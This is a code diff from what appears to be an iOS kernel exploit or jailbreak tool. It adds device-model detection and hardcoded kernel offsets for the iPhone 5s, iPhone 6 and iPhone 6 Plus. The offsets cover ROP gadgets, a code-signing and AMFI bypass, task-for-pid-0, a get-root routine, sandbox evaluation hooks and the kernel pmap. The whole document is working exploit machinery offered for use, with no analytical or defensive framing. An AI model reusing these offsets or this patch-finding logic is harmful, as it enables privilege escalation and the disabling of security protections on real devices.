@@ -4,6 +4,8 @@
 #include <mach/mach.h>
 #include <sys/stat.h>
 #include <sys/mount.h>
+#include <sys/utsname.h>
+
 #include <copyfile.h>
 #include <pthread.h>
 
@@ -71,6 +73,15 @@ extern "C" {
 
 #define WaitForLog() { usleep(10 * 1000); }
 #define UTZLog(format, ...) { NSLog(format, ##__VA_ARGS__); WaitForLog(); }
+
+NSString* GetDeviceModel()
+{
+	struct utsname systemInfo;
+	uname(&systemInfo);
+	
+	return [NSString stringWithCString:systemInfo.machine
+							  encoding:NSUTF8StringEncoding];
+}
 
 #pragma mark -
 #pragma mark mach_msg structuress
@@ -874,38 +885,79 @@ struct PatchFinder
 //		MAPIO			= find_lwvm_mapio_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
 //		SB_TRACE		= find_sb_backtrace_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
 		
-		// These are hardcoded offsets for iPhone 5s
+		// These are hardcoded offsets for iPhone 5s, iPhone 6, iPhone 6 Plus
 
-		// gadgets
-		ADD_X0_232				= m_kernelBase + m_kaslrSlide + 0x0F586C;
-		LDR_X0_X8_W1_SXTW_2		= m_kernelBase + m_kaslrSlide + 0x3834C8;
-		STRB_W1_X8_W2_UXTW		= m_kernelBase + m_kaslrSlide + 0x3A13CC;
-		LDR_X0_X1_32			= m_kernelBase + m_kaslrSlide + 0x3DA2AC;
-		STR_W3_X1_W2_UXTW		= m_kernelBase + m_kaslrSlide + 0xED4670;
-		//
-		INVALIDATE_TLB			= m_kernelBase + m_kaslrSlide + 0x0DEAD0;
-		FLUSHCACHE				= m_kernelBase + m_kaslrSlide + 0x0CDC84;
-		//
-		AMFI_GET_OUT_OF_MY_WAY	= m_kernelBase + m_kaslrSlide + 0x6AF290;
-		MOUNT_COMMON			= m_kernelBase + m_kaslrSlide + 0x110ABC;
-		CS_ENFORCE				= m_kernelBase + m_kaslrSlide + 0x6AF291;
-		VM_MAP_ENTER			= m_kernelBase + m_kaslrSlide + 0x084648;
-		VM_MAP_PROTECT			= m_kernelBase + m_kaslrSlide + 0x086298;
-		TFP0					= m_kernelBase + m_kaslrSlide + 0x37C2B0;
-		GET_R00T				= m_kernelBase + m_kaslrSlide + 0x314E98;
-		ICHDB_1					= m_kernelBase + m_kaslrSlide + 0x526804;
-		ICHDB_2					= m_kernelBase + m_kaslrSlide + 0x525EF4;
-		PROC_ENFORCE			= m_kernelBase + m_kaslrSlide + 0x4BEF64;
-		MAPIO					= m_kernelBase + m_kaslrSlide + 0xFBDEEC;
-		SB_TRACE				= m_kernelBase + m_kaslrSlide + 0xCC1750;
-		//
-		SB_EVALUATE_HOOK		= m_kernelBase + m_kaslrSlide + 0x001000;
-		SB_EVALUATE				= m_kernelBase + m_kaslrSlide + 0xCBDD24;
-		VN_GETPATH				= m_kernelBase + m_kaslrSlide + 0x10978C;
-		//
-		KERNEL_PMAP				= m_kernelBase + m_kaslrSlide + 0x4AA138;
-		PHYS_ADDR				= m_kernelBase + m_kaslrSlide + 0x540040;
-
+		NSString* device = GetDeviceModel();
+		UTZLog(@"[INF:PTF] Device model: %@", device);
+		
+		if ([device isEqualToString:@"iPhone6,1"] || [device isEqualToString:@"iPhone6,2"]) // iPhone 5s
+		{
+			ADD_X0_232				= m_kernelBase + m_kaslrSlide + 0x0F586C;
+			LDR_X0_X8_W1_SXTW_2		= m_kernelBase + m_kaslrSlide + 0x3834C8;
+			STRB_W1_X8_W2_UXTW		= m_kernelBase + m_kaslrSlide + 0x3A13CC;
+			LDR_X0_X1_32			= m_kernelBase + m_kaslrSlide + 0x3DA2AC;
+			STR_W3_X1_W2_UXTW		= m_kernelBase + m_kaslrSlide + 0xED4670;
+			//
+			INVALIDATE_TLB			= m_kernelBase + m_kaslrSlide + 0x0DEAD0;
+			FLUSHCACHE				= m_kernelBase + m_kaslrSlide + 0x0CDC84;
+			//
+			AMFI_GET_OUT_OF_MY_WAY	= m_kernelBase + m_kaslrSlide + 0x6AF290;
+			MOUNT_COMMON			= m_kernelBase + m_kaslrSlide + 0x110ABC;
+			CS_ENFORCE				= m_kernelBase + m_kaslrSlide + 0x6AF291;
+			VM_MAP_ENTER			= m_kernelBase + m_kaslrSlide + 0x084648;
+			VM_MAP_PROTECT			= m_kernelBase + m_kaslrSlide + 0x086298;
+			TFP0					= m_kernelBase + m_kaslrSlide + 0x37C2B0;
+			GET_R00T				= m_kernelBase + m_kaslrSlide + 0x314E98;
+			ICHDB_1					= m_kernelBase + m_kaslrSlide + 0x526804;
+			ICHDB_2					= m_kernelBase + m_kaslrSlide + 0x525EF4;
+			PROC_ENFORCE			= m_kernelBase + m_kaslrSlide + 0x4BEF64;
+			MAPIO					= m_kernelBase + m_kaslrSlide + 0xFBDEEC;
+			SB_TRACE				= m_kernelBase + m_kaslrSlide + 0xCC1750;
+			//
+			SB_EVALUATE_HOOK		= m_kernelBase + m_kaslrSlide + 0x001000;
+			SB_EVALUATE				= m_kernelBase + m_kaslrSlide + 0xCBDD24;
+			VN_GETPATH				= m_kernelBase + m_kaslrSlide + 0x10978C;
+			//
+			KERNEL_PMAP				= m_kernelBase + m_kaslrSlide + 0x4AA138;
+			PHYS_ADDR				= m_kernelBase + m_kaslrSlide + 0x540040;
+		}
+		else if ([device isEqualToString:@"iPhone7,1"] || [device isEqualToString:@"iPhone7,2"]) // iPhone 6, iPhone 6 Plus
+		{
+			ADD_X0_232				= m_kernelBase + m_kaslrSlide + 0x0F589C;
+			LDR_X0_X8_W1_SXTW_2		= m_kernelBase + m_kaslrSlide + 0x383518;
+			STRB_W1_X8_W2_UXTW		= m_kernelBase + m_kaslrSlide + 0x3A13CC;
+			LDR_X0_X1_32			= m_kernelBase + m_kaslrSlide + 0x3DA2CC;
+			STR_W3_X1_W2_UXTW		= m_kernelBase + m_kaslrSlide + 0xF29670;
+			//
+			INVALIDATE_TLB			= m_kernelBase + m_kaslrSlide + 0x0DEAD0;
+			FLUSHCACHE				= m_kernelBase + m_kaslrSlide + 0x0DEAB8;
+			//
+			AMFI_GET_OUT_OF_MY_WAY	= m_kernelBase + m_kaslrSlide + 0x6C4290;
+			MOUNT_COMMON			= m_kernelBase + m_kaslrSlide + 0x110AEC;
+			CS_ENFORCE				= m_kernelBase + m_kaslrSlide + 0x6C4291;
+			VM_MAP_ENTER			= m_kernelBase + m_kaslrSlide + 0x084648;
+			VM_MAP_PROTECT			= m_kernelBase + m_kaslrSlide + 0x08629C;
+			TFP0					= m_kernelBase + m_kaslrSlide + 0x37C2D4;
+			GET_R00T				= m_kernelBase + m_kaslrSlide + 0x314EC4;
+			ICHDB_1					= m_kernelBase + m_kaslrSlide + 0x532804;
+			ICHDB_2					= m_kernelBase + m_kaslrSlide + 0x531EF4;
+			PROC_ENFORCE			= m_kernelBase + m_kaslrSlide + 0x4CAF64;
+			MAPIO					= m_kernelBase + m_kaslrSlide + 0xF8FEEC;
+			SB_TRACE				= m_kernelBase + m_kaslrSlide + 0xC8F750;
+			//
+			SB_EVALUATE_HOOK		= m_kernelBase + m_kaslrSlide + 0x001000;
+			SB_EVALUATE				= m_kernelBase + m_kaslrSlide + 0xC8BD24;
+			VN_GETPATH				= m_kernelBase + m_kaslrSlide + 0x1097BC;
+			//
+			KERNEL_PMAP				= m_kernelBase + m_kaslrSlide + 0x4B6138;
+			PHYS_ADDR				= m_kernelBase + m_kaslrSlide + 0x54C040;
+		}
+		else
+		{
+			UTZLog(@"[INF:PTF] Unsupported device model (%@)", device);
+			return false;
+		}
+	
 		return true;
 	}
 	
